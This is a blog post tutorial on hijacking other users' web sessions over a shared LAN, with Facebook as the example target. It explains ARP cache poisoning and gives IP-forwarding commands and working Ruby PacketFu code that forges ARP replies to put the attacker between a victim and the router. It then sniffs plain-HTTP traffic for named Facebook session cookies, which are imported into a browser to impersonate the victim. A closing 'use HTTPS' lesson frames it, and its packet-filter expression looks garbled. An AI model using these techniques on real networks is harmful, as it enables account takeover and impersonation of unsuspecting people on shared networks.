---
layout: post
title: "How to Steal a Facebook Identity"
category: posts
permalink: "steal-facebook-identity"
featured_image: /images/hack_facebook.jpg 
description: "How to steal a facebook identity. Identity theft in general - a heads up on why you should use HTTPS for all sites you have an account on."
keywords:
- identity theft
- facebook
- security
- arp spoofing
comments: true
share: true
image:
  social: 2E087549C4.jpg
  social_thumb: 
---
How to hack cookie based authentication - a.k.a why you should use HTTPS for all sites you have an account on.


*UPDATE: This hack no longer works with Facebook as its https only now. Cool. This technique though can still be applied to other sites.*

So you want to know how to steal someone’s facebook identity. How to impersonate the poor victim. How to post embarrassing status updates, pictures in his/her name. Naughty, aren’t we? Let’s view this as a tech challenge instead, forget the nasty things we could do with it. This howto touches basic online security issues and some networking internals. Prepare for the journey, fasten your seatbelts. 

Guys, first, seriously, this is definitely not a nice thing to do. Really. Don’t do it. Stop reading right now. 

Well, if you still insist… 

Here’s a list of ingredients: 

* A LAN to operate on. It can be your school’s LAN, your workplace or your home router’s network.
* Some basic knowledge about network protocols: ARP, TCP/IP, Ethernet and HTTP
* Ruby skills. Get some. Really. Trust me, it’s worth it!
* A UNIX-based OS. This might work on windows, too, but no guarantees. I use OS X for daily work.
* Patience. Sometimes a lot.

So, let’s get to know the concepts step by step.
## A short intro to ARP

ARP stands for “Address Resolution Protocol” and - well, what do you know - it handles MAC and IP address conversions on a conventional TCP/IP ethernet based network. As you all know, TCP/IP packets are encapsulated in Ethernet packets, and Ethernet only knows those so-called [MAC (Media Access Control)](http://en.wikipedia.org/wiki/MAC_address) addresses, it has no idea about IP addresses or domain names.

When you send a standard TCP/IP packet from your machine, your OS wraps it up in a nice Ethernet packet and asks your network card to kindly send it to the network card which has the destination MAC address (it is much more complicated (routing, etc.) but this is enough for us in this project).

Therefore your OS needs to know which IP address(es) belong to which MAC address. Of course if there’s a router involved (and there must be if you’re on a LAN) it also needs to know this. This table is filled up when ARP messages travel on the network. An ARP announcement or reply message basically says “hey guys, the IP 1.2.3.4 is associated to the mac address 03:f9:06:e4:6b:0b”.

This IP <—-> MAC conversion list is called the ARP table or ARP cache. We are going to ‘poison’ this table. More on this a few paragraphs later.

## A few thoughts on sessions, users and logins

Most sites are using cookies to handle user logins and authentication. HTTP is a statelessprotocol. A stateless protocol does not require the server to retain information or status about each user for the duration of multiple requests. To have some kind of identification, we use cookies. A cookie is a key-value pair stored in the browser (so client-side) with two more extra information: lifetime and access control. With each request, if the cookie is still alive (lifetime) and the access control allows the server to receive the cookie, the client sends the cookie in its headers. You can read more on this [here](http://en.wikipedia.org/wiki/HTTP_cookie). The cookies are first sent by the server (or server application) which this way try to store user-level data, such as login state, userid, etc.

For example, the most interesting cookies coming from facebook are: c_user , datr , sct and xs - they are enough to identify session for a logged in user. When we log in to facebook, these cookies get set and on every request the server knows who we are (and that we are logged in) using these cookies which the browser sends back every time. We will  intercept these cookies travelling on the network from our victom to facebook’s servers.

## How to intercept communication on a LAN

This is actually easier than you’d think, thanks to serious security flaws in the design of the ARP protocol. Well, ARP is old and back then there weren’t so big security concerns.

Basically we’re going to lie to our victim’s machine saying we’re the router, and also lie to the router saying we’re the victim’s machine.

Let’s imagine a network with 3 hosts: 1 router and 2 client ‘user’ machines. The router has the IP 10.0.0.1 and the clients have 10.0.0.100 and 10.0.0.101. We are 10.0.0.100 and our victim is 10.0.0.101.

To achieve this, recall ARP. We send an ARP announcement/reply to the victim’s machine stating that the router’s IP address is associated to our MAC address, thus every TCP/IP package sent to the router by the victim’s machine will actually be sent to us. The other half of the story is that we also send an ARP message to the router saying that the victim’s IP address is associated to our MAC address this way we get the response packages coming from the router to the client. Then all we need to do is read the travelling packages while forwarding them respectively to the router and the client (so that packages really also reach their destination).

Well, we also need to enable something in the OS which is called ‘packet forwarding’ so that packages not targeted to us get accepted and parsed.

In linux, it is a simple
{% highlight bash %}
echo 1 > /proc/sys/net/ipv4/ip_forward
{% endhighlight %}

In OS X, it’s a bit different
{% highlight bash %}
sysctl -w net.inet.ip.forwarding=1
{% endhighlight %}

 
## Now the stage is set to do some programming.

We will use ruby (1.8 and 1.9 are both good), and we will need the gem called ’PacketFu’ and its dependency PcapRub which is a ruby wrapper to the libpcap library. These will help us with low-level network operations and packet capturing, parsing.

First things first, let’s send out the ARP spoofing packages:

{% highlight ruby %}
arp_packet_victim = PacketFu::ARPPacket.new()
arp_packet_victim.eth_saddr = 'd2:7b:9c:71:7b:6f'       # our MAC address
arp_packet_victim.eth_daddr = 'd4:9e:cb:08:5a:27'       # the victim's MAC address
arp_packet_victim.arp_saddr_mac = 'd2:7b:9c:71:7b:6f'   # our MAC address
arp_packet_victim.arp_daddr_mac = 'd4:9e:cb:08:5a:27'   # the victim's MAC address
arp_packet_victim.arp_saddr_ip = '10.0.0.1'             # the router's IP
arp_packet_victim.arp_daddr_ip = '10.0.0.101'           # the victim's IP
arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply

arp_packet_router = PacketFu::ARPPacket.new()
arp_packet_router.eth_saddr = 'd2:7b:9c:71:7b:6f'       # our MAC address
arp_packet_router.eth_daddr = '29:ef:54:43:78:32'       # the router's MAC address
arp_packet_router.arp_saddr_mac = 'd2:7b:9c:71:7b:6f'   # our MAC address
arp_packet_router.arp_daddr_mac = '29:ef:54:43:78:32'   # the router's MAC address
arp_packet_router.arp_saddr_ip = '10.0.0.101'           # the victim's IP
arp_packet_router.arp_daddr_ip = '10.0.0.1'             # the router's IP
arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

# we send out both packages
arp_packet_victim.to_w(@interface)
arp_packet_router.to_w(@interface)
 {% endhighlight %}

Actually in a real-world situation we need to keep sending these packages during the whole capturing session, for example in a thread.

Now we start a capturing session on the designated interface with some default filtering (port: 80 and HTTP requests. See the filter format docs for more info)

{% highlight ruby %}
capture_session = PacketFu::Capture.new(:iface => 'eth0', :start => true, :promisc => true, :filter => "tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<>2)) != 0)")
{% endhighlight %}


Now we only need to see if there’s any cookie travelling:
{% highlight ruby %}
capture_session.stream.each { |packet|
  puts "Woohoo I found a cookie" if packet =~ /ookie/
}
{% endhighlight %}

 

Nice and easy. We can then parse these cookies and save them in for example netscape cookie format, which we can import  to a browser session with a firefox plugin called Cookie importer.

### So, what is the lesson? Always use HTTPS. Always.

*UPDATE*

I’ve published the code: [https://github.com/ochronus/ArpSpoof](https://github.com/ochronus/ArpSpoof)
